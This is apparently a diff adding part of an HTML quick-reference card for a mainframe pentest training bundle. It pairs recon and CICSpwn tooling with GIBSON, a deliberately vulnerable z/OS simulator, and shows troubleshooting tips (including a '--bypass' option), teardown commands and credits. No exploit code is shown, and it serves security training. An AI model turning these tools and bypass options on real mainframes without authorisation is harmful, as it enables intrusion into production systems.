+          <p class="note">Needs a working <code>IRDR</code> TD queue and a live JES spool token. Treat as the objective for a full target, not a guaranteed result on base GIBSON.</p>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <!-- TROUBLESHOOTING -->
+  <section id="trouble">
+    <div class="sec-head">
+      <span class="sec-num">§</span>
+      <h2>Troubleshooting</h2>
+    </div>
+    <div class="scroll">
+      <table>
+        <thead><tr><th>Symptom</th><th>Meaning / fix</th></tr></thead>
+        <tbody>
+          <tr><td class="t-sym">ImportError: x3270App&nbsp;/&nbsp;"bytes found"</td><td>Ran the unpatched tool with system Python. Use <code class="mono">./cicspwn</code> or <code class="mono">.venv/bin/python cicspwn.py</code>.</td></tr>
+          <tr><td class="t-sym">"Could not find a password field"</td><td>GIBSON didn't present a sign-on screen. Run without <code class="mono">-U/-P</code>, or start GIBSON in realistic-auth mode.</td></tr>
+          <tr><td class="t-sym">"Keyboard locked / Operator error"</td><td>Panel not accepting input where expected. Confirm the target is the reworked GIBSON build.</td></tr>
+          <tr><td class="t-sym">"Could not list tsqueues through Inquire"</td><td>Retry the command with <code class="mono">--bypass</code> (Lab 4).</td></tr>
+          <tr><td class="t-sym">ezrecon hangs on a bare run</td><td>The TUI needs a real terminal. Use Terminal.app / iTerm, not a pipe or non-interactive shell.</td></tr>
+          <tr><td class="t-sym">ezrecon whois → only the IANA stub</td><td>Outbound port 43 blocked on this network. WHOIS is richer on an unfiltered link; DNS and crt.sh still work.</td></tr>
+          <tr><td class="t-sym">crtsh / wayback return nothing</td><td>Those services were flaky during setup. Retry — they rate-limit. Not an install problem.</td></tr>
+          <tr><td class="t-sym">dork --fetch → "engines rate-limited"</td><td>A fresh SearXNG gets throttled by upstreams. <code class="mono">--links</code> always works; a Google CSE key makes <code class="mono">--fetch</code> reliable.</td></tr>
+          <tr><td class="t-sym">nse / MyMap → "nmap not found"</td><td>Shouldn't happen now. The hint text says <code class="mono">apt</code> even on macOS — ignore it.</td></tr>
+          <tr><td class="t-sym">MyMap "Refresh script.db" fails</td><td>Needs <code class="mono">sudo nmap --script-updatedb</code> in your own terminal. Not required — brew shipped a built db.</td></tr>
+          <tr><td class="t-sym">Reports say "EZRecon 2.0 / passive only"</td><td>Known stale strings in this build. Cosmetic — the tool is 2.23.4 and has the nmap runner.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- END OF DAY -->
+  <section id="teardown">
+    <div class="sec-head">
+      <span class="sec-num">§</span>
+      <h2>End of day</h2>
+    </div>
+    <div class="cmd"><button class="copy" type="button">copy</button><pre>./stop.sh            <span class="c"># stops SearXNG</span>
+./stop.sh --all      <span class="c"># also stops GIBSON if this host started it</span></pre></div>
+    <p class="note">Full removal later: <code>pipx uninstall ezrecon</code>, <code>docker rm -f ezrecon-searxng</code>,
+      <code>brew uninstall nmap s3270</code>, then delete <code>~/git/Ezrecon/ezrecon-src</code> and <code>~/git/Ezrecon/cicspwn</code>.</p>
+  </section>
+
+  <!-- CREDITS -->
+  <section id="credits">
+    <div class="sec-head">
+      <span class="sec-num">§</span>
+      <h2>Credits</h2>
+    </div>
+    <div class="labs">
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">eZrecon</span><span class="lab-purpose">Kev Milne (OffensiveSec.org) &amp; Phil Young (Soldier of Fortran)</span></div>
+        <div class="lab-body"><p class="note">A rebuild of the EZRecon tool from the <i>Hacking Mainframes</i> companion material. The recon engine, mainframe fingerprinting, the dork and Shodan catalogues, and the TUI are their work.</p></div>
+      </div>
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">CICSpwn</span><span class="lab-purpose">Ayoub Elaassal (@Ayoul3) · GPL</span></div>
+        <div class="lab-body"><p class="note">This build carries only three py3270 compatibility fixes; the CICS logic is unchanged.</p></div>
+      </div>
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">Mainframe NSE scripts</span><span class="lab-purpose">largely Phil Young's research, upstreamed into nmap</span></div>
+        <div class="lab-body"><p class="note"><code>tn3270-*</code>, <code>cics-*</code>, <code>tso-*</code>, <code>vtam-enum</code>, <code>drda-*</code>, <code>nje-*</code>.</p></div>
+      </div>
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">GIBSON simulator</span><span class="lab-purpose">Kev Milne</span></div>
+        <div class="lab-body"><p class="note">The deliberately vulnerable z/OS training target the CICSpwn labs run against.</p></div>
+      </div>
+      <div class="lab">
+        <div class="lab-id"><span class="lab-name">EZrecon-2</span><span class="lab-purpose">this bundle</span></div>
+        <div class="lab-body"><p class="note">The macOS-verified packaging, the setup/start scripts, this card, and the web3270 SecTools integration work, built on all of the above.</p></div>
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <b>Set up &amp; verified:</b> pipx ezrecon 2.23.4 · Homebrew nmap 7.991 · s3270 · SearXNG on :10080 · cicspwn venv + py3270<br>
+    <b>Built on:</b> eZrecon by Kev Milne &amp; Phil Young · CICSpwn by Ayoub Elaassal (@Ayoul3) · GIBSON by Kev Milne<br>
+    <b>Source of truth:</b> ~/git/Ezrecon/TRAINING-QUICKREF.md · CICSpwn-Lab-Guide.pdf · eZrecon F1 help
+  </footer>
+
+</div>
+
+<script>
+  (function () {
+    var root = document.documentElement;
+    var KEY = 'mrlc-theme';
+    var btn = document.querySelector('.theme-toggle');
+
+    function systemDark() {
+      return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+    }
+    function current() {
+      return root.dataset.theme || (systemDark() ? 'dark' : 'light');
+    }
+    function label() {
+      btn.textContent = current() === 'dark' ? 'Light' : 'Dark';
+    }
+    try {
+      var saved = localStorage.getItem(KEY);
+      if (saved === 'dark' || saved === 'light') root.dataset.theme = saved;
+    } catch (e) {}
+    label();
+    btn.addEventListener('click', function () {
+      var next = current() === 'dark' ? 'light' : 'dark';
+      root.dataset.theme = next;
+      try { localStorage.setItem(KEY, next); } catch (e) {}
+      label();
+    });
+
+    document.querySelectorAll('.cmd').forEach(function (block) {
+      var b = block.querySelector('.copy');
+      var src = block.querySelector('pre');
+      if (!b || !src) return;
+      b.addEventListener('click', function () {
+        var text = src.innerText.replace(/ /g, ' ');
+        function done(ok) {
+          b.textContent = ok ? 'copied' : 'select all';
+          if (ok) b.dataset.state = 'ok';
+          setTimeout(function () { b.textContent = 'copy'; b.removeAttribute('data-state'); }, 1400);
+        }
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+          navigator.clipboard.writeText(text).then(function () { done(true); }, function () { done(false); });
+        } else {
+          done(false);
+        }
+      });
+    });
+  })();
+</script>
